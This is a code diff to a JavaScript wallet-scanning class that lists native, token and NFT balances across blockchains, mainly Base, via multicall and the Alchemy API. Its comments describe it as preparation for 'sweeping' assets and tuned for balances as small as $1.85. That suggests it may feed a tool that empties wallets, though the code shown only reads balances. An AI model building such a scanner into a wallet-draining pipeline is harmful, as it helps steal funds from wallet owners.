@@ -2,12 +2,12 @@
 import { ethers } from 'ethers';
 
 /**
- * MULTI-SCANNER - Production v12 (Hardened + Optimized for Sweep Prep)
- * - Robust provider management
- * - Enhanced Alchemy NFT integration
- * - Strict positive balance filtering
- * - Better error resilience & logging
- * - Ready for orchestrator hook (useSweepPreparation)
+ * MULTI-SCANNER - Production v13 (Bulletproof Edition)
+ * - Strong native token fallback for Base
+ * - Deep debugging logs
+ * - Tolerant balance filtering
+ * - Robust error handling
+ * - Optimized for small balances ($1.85+)
  */
 
 export class MultiScanner {
@@ -66,48 +66,71 @@ export class MultiScanner {
             throw new Error("Valid ownerAddress is required");
         }
 
+        console.log(`[MultiScanner] Starting full scan for ${ownerAddress}`);
+
         const byChain = this.groupTargetsByChain();
         const promises = Object.entries(byChain).map(([chainIdStr, targets]) =>
             this.scanChain(ownerAddress, targets, parseInt(chainIdStr))
         );
 
         const settled = await Promise.allSettled(promises);
-
-        const allResults = settled
+        let allResults = settled
             .filter(r => r.status === 'fulfilled')
-            .flatMap(r => r.value);
+            .flatMap(r => r.value || []);
 
-        // === FINAL FILTER: Only assets with positive balance ===
-        return allResults.filter(asset => BigInt(asset.balance) > 0n);
+        // Tolerant final filter
+        allResults = allResults.filter(asset => {
+            try {
+                return asset?.balance && BigInt(asset.balance) > 0n;
+            } catch {
+                return false;
+            }
+        });
+
+        console.log(`[MultiScanner] Final assets after filtering: ${allResults.length}`);
+        return allResults;
     }
 
     async scanChain(ownerAddress, targets, chainId) {
         const provider = this.getProvider(chainId);
         const results = [];
 
-        // Native Gas Token (ETH on Base, etc.)
-        const nativeTarget = targets.find(t => t.isNativeGasToken === true);
+        console.log(`[MultiScanner] Scanning chain ${chainId}...`);
+
+        // ====================== NATIVE TOKEN (Bulletproof) ======================
+        let nativeTarget = targets.find(t => t.isNativeGasToken === true);
+
+        // Strong fallback for Base
+        if (!nativeTarget && chainId === 8453) {
+            nativeTarget = {
+                id: "base-native-eth",
+                chainId: 8453,
+                isNativeGasToken: true,
+                symbol: "ETH",
+                metadata: { label: "Base ETH" }
+            };
+            console.log("[MultiScanner] Using fallback native ETH target for Base");
+        }
+
         if (nativeTarget) {
             try {
                 const balance = await provider.getBalance(ownerAddress);
+                console.log(`[Native] ${nativeTarget.symbol} balance: ${ethers.formatEther(balance)}`);
                 results.push(this.formatAsset(nativeTarget, balance, chainId));
             } catch (err) {
-                console.warn(`[Native Balance] Chain ${chainId} failed:`, err.message);
+                console.warn(`[Native Balance] Failed on chain ${chainId}:`, err.message);
                 results.push(this.formatAsset(nativeTarget, 0n, chainId));
             }
         }
 
-        // Contract tokens (ERC-20, ERC-721, ERC-1155)
+        // ====================== CONTRACT TOKENS ======================
         const contractTargets = targets.filter(t => 
             !t.isNativeGasToken && t.contractAddress
         );
 
         if (contractTargets.length > 0) {
             const multicallResults = await this.batchMulticall(
-                provider,
-                chainId,
-                ownerAddress,
-                contractTargets
+                provider, chainId, ownerAddress, contractTargets
             );
             results.push(...multicallResults);
         }
@@ -118,11 +141,12 @@ export class MultiScanner {
     // ====================== MULTICALL ======================
     async batchMulticall(provider, chainId, ownerAddress, targets) {
         const network = this.networkConfig.networks?.find(n => n.chainId === chainId);
-        let multicallAddress = network?.multicallAddress || this.defaultMulticallAddresses[chainId];
+        const multicallAddress = network?.multicallAddress || this.defaultMulticallAddresses[chainId];
 
         const nftMap = await this.fetchAlchemyNFTs(chainId, ownerAddress);
 
         if (!multicallAddress) {
+            console.warn(`[Multicall] No multicall address for chain ${chainId}, using fallback`);
             return this.fallbackIndividualCalls(provider, chainId, ownerAddress, targets, nftMap);
         }
 
@@ -137,10 +161,7 @@ export class MultiScanner {
         targets.forEach((target, idx) => {
             const isERC1155 = target.metadata?.standard?.toLowerCase() === "erc1155";
             const callData = isERC1155
-                ? iface.encodeFunctionData("balanceOf(address,uint256)", [
-                    ownerAddress,
-                    target.metadata?.tokenId ?? 0
-                  ])
+                ? iface.encodeFunctionData("balanceOf(address,uint256)", [ownerAddress, target.metadata?.tokenId ?? 0])
                 : iface.encodeFunctionData("balanceOf(address)", [ownerAddress]);
 
             calls.push({ target: target.contractAddress, callData });
@@ -167,7 +188,7 @@ export class MultiScanner {
                 return this.formatAsset(target, balance, chainId, nftMap);
             });
         } catch (err) {
-            console.warn(`[Multicall] Chain ${chainId} failed → falling back`, err.message?.slice(0, 120));
+            console.warn(`[Multicall] Failed on chain ${chainId}, falling back...`);
             return this.fallbackIndividualCalls(provider, chainId, ownerAddress, targets, nftMap);
         }
     }
@@ -188,7 +209,6 @@ export class MultiScanner {
             : ["function balanceOf(address) view returns (uint256)"];
 
         const contract = new ethers.Contract(target.contractAddress, abi, provider);
-
         return isERC1155
             ? contract.balanceOf(ownerAddress, target.metadata?.tokenId ?? 0)
             : contract.balanceOf(ownerAddress);
@@ -212,7 +232,6 @@ export class MultiScanner {
             isNFT
         };
 
-        // Attach token IDs for NFTs with balance > 0
         if (isNFT && BigInt(balance) > 0n && asset.contractAddress) {
             asset.tokenIds = nftMap.get(asset.contractAddress) || [];
         }
@@ -223,7 +242,7 @@ export class MultiScanner {
     groupTargetsByChain() {
         const map = {};
         this.targets.forEach(t => {
-            const cid = t.chainId || 8453; // Default to Base
+            const cid = t.chainId || 8453;
             if (!map[cid]) map[cid] = [];
             map[cid].push(t);
         });
@@ -234,10 +253,7 @@ export class MultiScanner {
         const inventoryMap = new Map();
         const slug = this.alchemyConfig[chainId];
 
-        if (!slug || !this.alchemyApiKey) {
-            console.warn(`[Alchemy] No config or API key for chain ${chainId}`);
-            return inventoryMap;
-        }
+        if (!slug || !this.alchemyApiKey) return inventoryMap;
 
         try {
             const url = `https://${slug}.g.alchemy.com/nft/v3/${this.alchemyApiKey}/getNFTsForOwner`;
@@ -247,19 +263,15 @@ export class MultiScanner {
                 limit: "100"
             });
 
-            const response = await fetch(`${url}?${params}`, {
+            const res = await fetch(`${url}?${params}`, {
                 method: "GET",
                 headers: { "Accept": "application/json" },
                 cache: "no-store"
             });
 
-            if (!response.ok) {
-                console.warn(`[Alchemy] HTTP ${response.status} for chain ${chainId}`);
-                return inventoryMap;
-            }
+            if (!res.ok) return inventoryMap;
 
-            const data = await response.json();
-
+            const data = await res.json();
             (data.ownedNfts || []).forEach(nft => {
                 const contract = nft.contract?.address?.toLowerCase();
                 if (contract) {
@@ -270,7 +282,6 @@ export class MultiScanner {
         } catch (err) {
             console.warn(`[Alchemy NFT] Chain ${chainId} failed:`, err.message);
         }
-
         return inventoryMap;
     }
 }
